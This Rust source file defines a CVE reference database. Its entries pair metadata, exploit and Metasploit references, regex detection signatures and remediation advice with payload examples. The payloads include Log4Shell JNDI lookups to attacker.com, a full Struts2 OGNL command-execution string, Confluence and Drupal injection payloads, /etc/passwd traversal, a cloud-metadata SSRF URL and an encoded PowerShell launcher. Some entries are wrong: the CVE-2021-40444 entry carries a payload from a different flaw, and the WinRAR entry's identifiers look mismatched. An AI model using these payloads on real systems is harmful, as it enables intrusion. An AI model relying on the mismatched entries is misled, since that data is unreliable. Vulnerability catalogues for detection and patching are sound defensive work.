//! Comprehensive CVE exploit database with payloads, signatures, and remediation guidance.

use serde::{Deserialize, Serialize};

/// A detailed CVE entry with exploit metadata.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct CveEntry {
    pub cve_id: String,
    pub known_exploited: bool,
    pub name: String,
    pub description: String,
    pub affected_component: String,
    pub affected_versions: Vec<String>,
    pub cwe_id: u32,
    pub attack_type: String,
    pub cvss_score: f32,
    pub cvss_vector: String,
    pub severity: String,
    pub exploit_urls: Vec<String>,
    pub metasploit_modules: Vec<String>,
    pub nuclei_templates: Vec<String>,
    pub detection_signatures: Vec<String>,
    pub payload_examples: Vec<String>,
    pub remediation: String,
    pub patch_urls: Vec<String>,
    pub tags: Vec<String>,
    pub owasp_category: String,
}

macro_rules! cve {
    ($id:expr, $ke:expr, $name:expr, $desc:expr, $comp:expr, $vers:expr, $cwe:expr, $attack:expr, $score:expr, $vector:expr, $sev:expr, $urls:expr, $msf:expr, $nuclei:expr, $sigs:expr, $payloads:expr, $rem:expr, $patches:expr, $tags:expr, $owasp:expr) => {
        CveEntry {
            cve_id: $id.into(),
            known_exploited: $ke,
            name: $name.into(),
            description: $desc.into(),
            affected_component: $comp.into(),
            affected_versions: $vers.iter().map(|s: &&str| s.to_string()).collect(),
            cwe_id: $cwe,
            attack_type: $attack.into(),
            cvss_score: $score,
            cvss_vector: $vector.into(),
            severity: $sev.into(),
            exploit_urls: $urls.iter().map(|s: &&str| s.to_string()).collect(),
            metasploit_modules: $msf.iter().map(|s: &&str| s.to_string()).collect(),
            nuclei_templates: $nuclei.iter().map(|s: &&str| s.to_string()).collect(),
            detection_signatures: $sigs.iter().map(|s: &&str| s.to_string()).collect(),
            payload_examples: $payloads.iter().map(|s: &&str| s.to_string()).collect(),
            remediation: $rem.into(),
            patch_urls: $patches.iter().map(|s: &&str| s.to_string()).collect(),
            tags: $tags.iter().map(|s: &&str| s.to_string()).collect(),
            owasp_category: $owasp.into(),
        }
    };
}

/// Base CVE records with verified exploit data.
fn base_cves() -> Vec<CveEntry> {
    vec![
        cve!(
            "CVE-2021-44228", true, "Apache Log4Shell",
            "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints.",
            "Apache Log4j 2", &["2.0-beta9", "2.14.1"],
            502, "JNDI-Injection", 10.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/50592", "https://github.com/tangxiaofeng7/apache-log4j-poc"],
            &["exploit/multi/http/log4shell_header_injection"],
            &["cves/2021/CVE-2021-44228.yaml"],
            &[r"\$\{jndi:(ldap|rmi|ldaps|dns|iiop|nis|nds|corba)://"],
            &["${jndi:ldap://attacker.com/a}", "${jndi:dns://attacker.com}"],
            "Upgrade to Log4j 2.17.1+ or remove JNDILookup class. Set log4j2.formatMsgNoLookups=true on 2.10-2.14.1.",
            &["https://logging.apache.org/log4j/2.x/security.html"],
            &["rce", "jndi", "ldap", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2022-22965", true, "Spring4Shell",
            "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding.",
            "Spring Framework", &["5.3.0", "5.3.17", "5.2.0", "5.2.19"],
            94, "SpEL-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/50375"],
            &["exploit/multi/http/spring4shell"],
            &["cves/2022/CVE-2022-22965.yaml"],
            &[r"class\.module\.classLoader", r"T\(java\.lang\.Runtime\)\.getRuntime\(\)\.exec"],
            &["class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i", "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"],
            "Upgrade to Spring Framework 5.3.18+ or 5.2.20+.",
            &["https://spring.io/security/cve-2022-22965"],
            &["rce", "spring", "spel", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2022-1388", true, "F5 BIG-IP iControl REST Authentication Bypass",
            "Undisclosed requests may bypass iControl REST authentication in F5 BIG-IP.",
            "F5 BIG-IP", &["16.1.0", "16.1.2", "15.1.0", "15.1.5"],
            306, "Auth-Bypass-RCE", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/50536"],
            &["exploit/linux/http/f5_icontrol_rest"],
            &["cves/2022/CVE-2022-1388.yaml"],
            &[r"/mgmt/tm/util/bash", r"X-F5-Auth-Token.*Connection:\s*close,\s*X-F5-Auth-Token"],
            &["POST /mgmt/tm/util/bash HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close, X-F5-Auth-Token\\r\\nX-F5-Auth-Token: a\\r\\n{\"command\":\"run\",\"utilCmdArgs\":\"-c 'id'\"}"],
            "Upgrade to patched BIG-IP versions; restrict management access.",
            &["https://support.f5.com/csp/article/K23605346"],
            &["rce", "auth-bypass", "f5", "bigip"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2022-26134", true, "Atlassian Confluence OGNL Injection",
            "An OGNL injection vulnerability in Confluence Server and Data Center allows unauthenticated attackers to execute arbitrary code.",
            "Atlassian Confluence", &["7.4.0", "7.18.0"],
            917, "OGNL-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/50581"],
            &["exploit/multi/http/atlassian_confluence_ognl"],
            &["cves/2022/CVE-2022-26134.yaml"],
            &[r"\$\{T\(java\.lang\.Runtime\)\.getRuntime\(\)\.exec", r"%24%7BT%28java\.lang\.Runtime"],
            &["/%24%7BT(java.lang.Runtime)%20.getRuntime%20%28%29%20.exec%20%28%27id%27%29%7D/"],
            "Upgrade to Confluence patched versions.",
            &["https://confluence.atlassian.com/security"],
            &["rce", "ognl", "confluence", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2021-41773", true, "Apache HTTP Server Path Traversal",
            "Apache 2.4.49 path traversal allowing file read via encoded path segments.",
            "Apache HTTP Server", &["2.4.49"],
            22, "Path-Traversal", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/50443"],
            &["exploit/multi/http/apache_normalize_path_rce"],
            &["cves/2021/CVE-2021-41773.yaml"],
            &[r"\.\./\.\./", r"\.\.%2f", r"\.%2e/"],
            &["/cgi-bin/.%2e/.%2e/.%2e/etc/passwd", "..%2f..%2f..%2fetc/passwd"],
            "Upgrade to Apache HTTP Server 2.4.50+.",
            &["https://httpd.apache.org/security/vulnerabilities_24.html"],
            &["path-traversal", "rce", "apache"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2021-42013", true, "Apache HTTP Server Path Traversal and RCE",
            "Path traversal and remote code execution in Apache HTTP Server 2.4.49 and 2.4.50.",
            "Apache HTTP Server", &["2.4.49", "2.4.50"],
            22, "Path-Traversal", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/50446"],
            &["exploit/multi/http/apache_normalize_path_rce"],
            &["cves/2021/CVE-2021-42013.yaml"],
            &[r"\.%%32%65", r"\.%2e%2f"],
            &["/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd", "/icons/.%2e/%2fetc/passwd"],
            "Upgrade to Apache HTTP Server 2.4.51+.",
            &["https://httpd.apache.org/security/vulnerabilities_24.html"],
            &["path-traversal", "rce", "apache"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2017-5638", true, "Apache Struts2 Jakarta Multipart Parser",
            "The Jakarta Multipart parser in Apache Struts 2 improperly handles Content-Type header values, leading to RCE.",
            "Apache Struts 2", &["2.3.5", "2.3.31", "2.5", "2.5.10"],
            20, "OGNL-Injection", 10.0, "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/41570"],
            &["exploit/multi/http/struts2_content_type_ognl"],
            &["cves/2017/CVE-2017-5638.yaml"],
            &[r"%\{(#_|#dm=@ognl\.OgnlContext@DEFAULT_MEMBER_ACCESS)"],
            &["%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"],
            "Upgrade to Struts 2.3.32 or 2.5.10.1+.",
            &["https://cwiki.apache.org/confluence/display/WW/S2-045"],
            &["rce", "struts2", "ognl", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2018-7600", true, "Drupalgeddon 2",
            "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allow remote code execution.",
            "Drupal", &["7.x", "8.3.x", "8.4.x", "8.5.0"],
            20, "Form-API-RCE", 9.8, "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.exploit-db.com/exploits/44449"],
            &["exploit/unix/webapp/drupal_drupalgeddon2"],
            &["cves/2018/CVE-2018-7600.yaml"],
            &[r"mail\[#post_render\]\[\]", r"#type=markup.*#post_render"],
            &["form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"],
            "Upgrade to Drupal 7.58, 8.3.9, 8.4.6, or 8.5.1+.",
            &["https://www.drupal.org/sa-core-2018-002"],
            &["rce", "drupal", "php"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2020-1472", true, "Zerologon",
            "An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection.",
            "Microsoft Netlogon", &["Windows Server 2008 R2", "Windows Server 2019"],
            330, "Cryptographic-Bypass", 10.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Critical",
            &["https://github.com/SecuraBV/CVE-2020-1472"],
            &["auxiliary/admin/dcerpc/cve_2020_1472_zerologon"],
            &["cves/2020/CVE-2020-1472.yaml"],
            &[r"NetrServerPasswordSet2.*0x00.*256"],
            &["python3 zerologon_tester.py DC01 192.168.1.10"],
            "Apply Microsoft August 2020 patch. Enable DC enforcement mode.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"],
            &["privilege-escalation", "windows", "active-directory"],
            "A02:2021-Cryptographic-Failures"
        ),
        cve!(
            "CVE-2021-34527", true, "PrintNightmare",
            "Windows Print Spooler remote code execution and local privilege escalation vulnerability.",
            "Windows Print Spooler", &["Windows 7", "Windows 10", "Windows Server 2019"],
            362, "LPE-RCE", 8.8, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "High",
            &["https://github.com/cube0x0/CVE-2021-1675"],
            &["exploit/windows/dcerpc/cve_2021_1675_printnightmare"],
            &["cves/2021/CVE-2021-34527.yaml"],
            &[r"RpcAddPrinterDriverEx.*APD_INSTALLWARNEDFLAG"],
            &["powershell -ep bypass .\\Invoke-Nightmare.ps1"],
            "Install Microsoft July 2021 patches. Disable Print Spooler where not needed.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
            &["rce", "lpe", "windows"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2021-40444", true, "MSHTML RCE",
            "Microsoft MSHTML remote code execution vulnerability.",
            "Microsoft Windows MSHTML", &["Windows 10", "Windows 11", "Windows Server 2019"],
            94, "Office-Macro-RCE", 8.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "High",
            &["https://github.com/lockedbyte/CVE-2021-40444"],
            &["exploit/windows/fileformat/office_mshtml_rce"],
            &["cves/2021/CVE-2021-40444.yaml"],
            &[r"\.cpl.*htmlfile.*ActiveXObject", r"mhtml:file://"],
            &["<script>location.href='ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(powershell -enc ...)'\"</script>"],
            "Install Microsoft September 2021 updates. Disable ActiveX and Office macros.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"],
            &["rce", "windows", "office"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2022-22963", true, "Spring Cloud Function SpEL",
            "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible to provide a specially crafted SpEL expression.",
            "Spring Cloud Function", &["3.1.6", "3.2.2"],
            917, "SpEL-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/me2nuk/CVE-2022-22963"],
            &["exploit/multi/http/spring_cloud_function_spel"],
            &["cves/2022/CVE-2022-22963.yaml"],
            &[r"spring\.cloud\.function\.routing-expression"],
            &["T(java.lang.Runtime).getRuntime().exec(\"id\")", "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"id\")"],
            "Upgrade to Spring Cloud Function 3.1.7 or 3.2.3+.",
            &["https://spring.io/security/cve-2022-22963"],
            &["rce", "spring", "spel", "java"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2023-46604", true, "Apache ActiveMQ OpenWire",
            "Apache ActiveMQ allows remote attackers with access to a broker to run arbitrary shell commands.",
            "Apache ActiveMQ", &["5.18.0", "5.18.2", "5.17.0", "5.17.6"],
            502, "Deserialization-RCE", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/sincere9/ActiveMQ-RCE"],
            &["exploit/multi/misc/apache_activemq_rce_cve_2023_46604"],
            &["cves/2023/CVE-2023-46604.yaml"],
            &[r"OpenWireProtocol.*ExceptionResponse.*ThrowableHolder"],
            &["python3 activemq-rce.py -i 192.168.1.10 -p 61616 --jmx"],
            "Upgrade to ActiveMQ 5.18.3 or 5.17.6+.",
            &["https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt"],
            &["rce", "activemq", "deserialization", "java"],
            "A08:2021-Software-and-Data-Integrity-Failures"
        ),
        cve!(
            "CVE-2023-42793", true, "JetBrains TeamCity Auth Bypass",
            "A critical authentication bypass vulnerability in JetBrains TeamCity CI/CD server.",
            "JetBrains TeamCity", &["2023.05.3", "2023.05.0"],
            306, "Auth-Bypass", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/H454NSec/CVE-2023-42793"],
            &["exploit/multi/http/jetbrains_teamcity_auth_bypass_rce_cve_2023_42793"],
            &["cves/2023/CVE-2023-42793.yaml"],
            &[r"/app/rest/users/id:1/tokens/RPC2"],
            &["POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1\\r\\nHost: target\\r\\nContent-Type: application/json"],
            "Upgrade to TeamCity 2023.05.4+.",
            &["https://www.jetbrains.com/privacy-security/teamcity-auth-bypass-2023-42793/"],
            &["auth-bypass", "teamcity", "cicd"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2024-27198", true, "JetBrains TeamCity Authentication Bypass",
            "An authentication bypass vulnerability in TeamCity Web server.",
            "JetBrains TeamCity", &["2023.11.3", "2023.11.0"],
            288, "Auth-Bypass", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-vulnerabilities/"],
            &["exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198"],
            &["cves/2024/CVE-2024-27198.yaml"],
            &[r"HTTP/1\.1 200.*Set-Cookie: TCSESSIONID=.*\/loginLogin\.html"],
            &["/lol?jsp=/admin/diagnostic.jsp"],
            "Upgrade to TeamCity 2023.11.4+.",
            &["https://www.jetbrains.com/privacy-security/teamcity-auth-bypass-2024-27198/"],
            &["auth-bypass", "teamcity", "rce"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2024-1709", true, "ConnectWise ScreenConnect Auth Bypass",
            "An authentication bypass in ConnectWise ScreenConnect allows creation of administrative users.",
            "ConnectWise ScreenConnect", &["23.9.7", "23.9.8", "23.9.10"],
            287, "Auth-Bypass", 10.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Critical",
            &["https://github.com/OlivierLaflamme/CVE-2024-1709"],
            &["exploit/windows/http/connectwise_screenconnect_auth_bypass"],
            &["cves/2024/CVE-2024-1709.yaml"],
            &[r"/SetupWizard\.aspx/?.*subaction=create"],
            &["GET /SetupWizard.aspx/ HTTP/1.1\\r\\nHost: target"],
            "Upgrade to ScreenConnect 23.9.8+ or apply patch.",
            &["https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"],
            &["auth-bypass", "screenconnect", "rce"],
            "A07:2021-Identification-and-Authentication-Failures"
        ),
        cve!(
            "CVE-2023-34362", true, "MOVEit Transfer SQL Injection",
            "A SQL injection vulnerability in MOVEit Transfer web application could allow privilege escalation and unauthorized access.",
            "Progress MOVEit Transfer", &["2023.0.0", "2023.0.3", "2022.1.x", "2022.0.x"],
            89, "SQLi-RCE", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/horizon3ai/CVE-2023-34362"],
            &["exploit/windows/http/moveit_transfer_cve_2023_34362"],
            &["cves/2023/CVE-2023-34362.yaml"],
            &[r"machine\.shtm\/lvwelcomenoshow", r"X-siLock-Comment"],
            &["POST /machine.aspx HTTP/1.1\\r\\nHost: target\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\narg12=..."],
            "Upgrade to MOVEit Transfer patched versions. Apply vendor IOC hunt guidance.",
            &["https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023"],
            &["sqli", "rce", "moveit"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2021-26855", true, "ProxyLogon",
            "Microsoft Exchange Server SSRF vulnerability enabling authentication bypass and remote code execution.",
            "Microsoft Exchange Server", &["Exchange Server 2013", "Exchange Server 2016", "Exchange Server 2019"],
            918, "SSRF", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/ZephrFish/ProxyLogon"],
            &["exploit/windows/http/exchange_proxylogon_rce"],
            &["cves/2021/CVE-2021-26855.yaml"],
            &[r"Cookie:.*X-AnonResource-Backend", r"X-CalculatedBETarget.*localhost"],
            &["GET /owa/auth/x.js HTTP/1.1\\r\\nHost: target\\r\\nCookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"],
            "Apply Microsoft March 2021 Exchange updates immediately.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855"],
            &["ssrf", "exchange", "proxylogon"],
            "A10:2021-Server-Side-Request-Forgery"
        ),
        cve!(
            "CVE-2021-27905", false, "Apache Solr SSRF",
            "Apache Solr ReplicationHandler contains an SSRF vulnerability via the masterUrl parameter.",
            "Apache Solr", &["7.0.0", "7.7.3", "8.0.0", "8.8.2"],
            918, "SSRF", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/Al1ex/CVE-2021-27905"],
            &[],
            &["cves/2021/CVE-2021-27905.yaml"],
            &[r"/solr/.*/replication.*command=fetchindex.*masterUrl"],
            &["/solr/core/replication?command=fetchindex&masterUrl=http://169.254.169.254/latest/meta-data/"],
            "Upgrade to Solr 8.8.3 or 7.7.4+. Restrict replication handler access.",
            &["https://solr.apache.org/security.html"],
            &["ssrf", "solr", "cloud-metadata"],
            "A10:2021-Server-Side-Request-Forgery"
        ),
        cve!(
            "CVE-2021-3156", true, "Sudo Baron Samedit",
            "Heap-based buffer overflow in sudo allows local privilege escalation.",
            "sudo", &["1.8.2", "1.8.31p2", "1.9.0", "1.9.5p1"],
            119, "Heap-Overflow", 7.8, "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "High",
            &["https://github.com/worawit/CVE-2021-3156"],
            &["exploit/linux/local/sudo_baron_samedit"],
            &["cves/2021/CVE-2021-3156.yaml"],
            &[r"sudoedit -s \\'\\\\\\\\.*\\\\\\\\'\\\\\\\\ 0123456789ABCDEF"],
            &["sudoedit -s '\\\\' `perl -e 'print \"A\"x65536'`"],
            "Upgrade to sudo 1.9.5p2+.",
            &["https://www.sudo.ws/security/advisories/barron_samedit/"],
            &["lpe", "sudo", "linux"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2023-44487", true, "HTTP/2 Rapid Reset",
            "HTTP/2 protocol vulnerability allows rapid stream resets causing denial of service.",
            "HTTP/2 Implementations", &["Generic"],
            400, "DoS", 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "High",
            &["https://github.com/cybercloudsys/rapid-reset-poc"],
            &[],
            &["cves/2023/CVE-2023-44487.yaml"],
            &[r"RST_STREAM.*ratio.*\d{2,}:1"],
            &["python3 rapidreset.py -u https://target"],
            "Implement rate limiting on HTTP/2 stream creation. Update load balancers and web servers.",
            &["https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/"],
            &["dos", "http2", "rapid-reset"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-3094", true, "xz Backdoor",
            "Malicious backdoor inserted into xz/liblzma versions 5.6.0 and 5.6.1.",
            "xz / liblzma", &["5.6.0", "5.6.1"],
            506, "Backdoor", 10.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Critical",
            &["https://github.com/amlweems/xzbot"],
            &[],
            &["cves/2024/CVE-2024-3094.yaml"],
            &[r"liblzma.*is_only_max_marker", r"ssh-.*liblzma"],
            &["xz --version | grep -E '5\\.6\\.[01]'"],
            "Downgrade to xz 5.4.x. Audit SSH daemon integrity. Rotate all keys.",
            &["https://tukaani.org/xz-backdoor/"],
            &["backdoor", "supply-chain", "linux", "ssh"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-21626", false, "runc Container Escape",
            "A file descriptor leak and subsequent working directory leak in runc can lead to container escape.",
            "runc", &["1.1.0", "1.1.11"],
            552, "Container-Escape", 8.6, "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H", "High",
            &["https://github.com/Wall1e/CVE-2024-21626-POC"],
            &[],
            &["cves/2024/CVE-2024-21626.yaml"],
            &[r"WORKDIR.*\/proc\/self\/fd"],
            &["docker run -it --workdir /proc/self/fd/8 ubuntu sh"],
            "Upgrade runc to 1.1.12+. Rebuild container images.",
            &["https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv"],
            &["container-escape", "runc", "docker"],
            "A05:2021-Security-Misconfiguration"
        ),
        cve!(
            "CVE-2024-4577", true, "PHP CGI Argument Injection",
            "When PHP runs in CGI mode on Windows, query string parameters can be passed directly to php-cgi, leading to code execution.",
            "PHP CGI", &["8.1.x", "8.2.x", "8.3.x"],
            88, "Argument-Injection", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/watchtowrlabs/CVE-2024-4577"],
            &["exploit/multi/http/php_cgi_arg_injection_rce"],
            &["cves/2024/CVE-2024-4577.yaml"],
            &[r"php-cgi\.exe.*%ad"],
            &["/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"],
            "Update PHP to 8.1.29, 8.2.21, 8.3.9+. Avoid PHP CGI on Windows.",
            &["https://www.php.net/archive/2024.php"],
            &["rce", "php", "cgi"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-6387", true, "OpenSSH regreSSHion",
            "Signal handler race condition in OpenSSH's server allows unauthenticated RCE on glibc-based Linux systems.",
            "OpenSSH", &["8.5p1", "9.7p1"],
            362, "Race-Condition", 8.1, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "High",
            &["https://github.com/zgzhang/cve-2024-6387-poc"],
            &["exploit/linux/ssh/openssh_signal_handler_race"],
            &["cves/2024/CVE-2024-6387.yaml"],
            &[r"OpenSSH_[89]\.[0-7]"],
            &["python3 regreSSHion.py target 22"],
            "Upgrade OpenSSH to 9.8p1+. Implement connection rate limiting.",
            &["https://www.openssh.com/txt/release-9.8"],
            &["rce", "openssh", "ssh"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-3400", true, "Palo Alto PAN-OS Command Injection",
            "A command injection vulnerability in Palo Alto Networks PAN-OS allows unauthenticated attackers to execute arbitrary code.",
            "Palo Alto PAN-OS", &["10.2", "11.0", "11.1"],
            77, "Command-Injection", 10.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "Critical",
            &["https://github.com/0x0d3ad/CVE-2024-3400"],
            &["exploit/linux/http/paloalto_pan-os_cmd_injection"],
            &["cves/2024/CVE-2024-3400.yaml"],
            &[r"/ssl-vpn/hipreport\.esp", r"SESSID=.*\.php"],
            &["GET /ssl-vpn/hipreport.esp?cookie=... HTTP/1.1"],
            "Apply Palo Alto Networks hotfix immediately. Restrict GlobalProtect portal access.",
            &["https://security.paloaltonetworks.com/CVE-2024-3400"],
            &["rce", "paloalto", "vpn"],
            "A03:2021-Injection"
        ),
        cve!(
            "CVE-2024-32002", false, "Git Submodule RCE",
            "Git can be tricked into running a hook from a submodule during a recursive clone.",
            "Git", &["2.45.0", "2.44.0", "2.43.0", "2.42.0"],
            78, "Command-Injection", 9.0, "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H", "Critical",
            &["https://github.com/amalmurali47/git_rce"],
            &[],
            &["cves/2024/CVE-2024-32002.yaml"],
            &[r"\.gitmodules.*symlink"],
            &["git clone --recursive https://github.com/evil/repo"],
            "Upgrade Git to 2.45.1, 2.44.1, 2.43.4, 2.42.2, or 2.40.2+.",
            &["https://git-scm.com/docs/RelNotes/2.45.1.txt"],
            &["rce", "git", "supply-chain"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-28000", false, "LiteSpeed Cache Privilege Escalation",
            "Unauthenticated privilege escalation in LiteSpeed Cache WordPress plugin via user simulation feature.",
            "LiteSpeed Cache WordPress Plugin", &["5.7.0", "6.4.0"],
            269, "Privilege-Escalation", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/aliicex/CVE-2024-28000-LiteSpeed-Cache-Unauthenticated-Privilege-Escalation"],
            &[],
            &["cves/2024/CVE-2024-28000.yaml"],
            &[r"/wp-json/litespeed/v1/simulate-role"],
            &["GET /wp-json/litespeed/v1/simulate-role?role=administrator HTTP/1.1"],
            "Update LiteSpeed Cache to 6.4.1+.",
            &["https://wordpress.org/plugins/litespeed-cache/"],
            &["privilege-escalation", "wordpress", "plugin"],
            "A01:2021-Broken-Access-Control"
        ),
        cve!(
            "CVE-2024-21413", true, "Microsoft Outlook RCE",
            "Microsoft Outlook remote code execution vulnerability via malicious link handling.",
            "Microsoft Outlook", &["Office 2016", "Office 2019", "Microsoft 365"],
            77, "RCE", 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "Critical",
            &["https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability"],
            &[],
            &["cves/2024/CVE-2024-21413.yaml"],
            &[r"file://.*!"],
            &["Click link: file://attacker.com!C:/Windows/System32/calc.exe"],
            "Install Microsoft February 2024 updates.",
            &["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413"],
            &["rce", "outlook", "monikerlink"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
        cve!(
            "CVE-2024-24809", false, "WinRAR Mark-of-the-Web Bypass",
            "WinRAR allows extraction of files that bypass Mark-of-the-Web protections.",
            "WinRAR", &["6.23"],
            1386, "Security-Feature-Bypass", 7.8, "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "High",
            &[],
            &[],
            &[],
            &[],
            &[],
            "Update WinRAR to 6.24+.",
            &["https://www.rarlab.com/rarnew.htm"],
            &["motw", "windows", "winrar"],
            "A06:2021-Vulnerable-and-Outdated-Components"
        ),
    ]
}

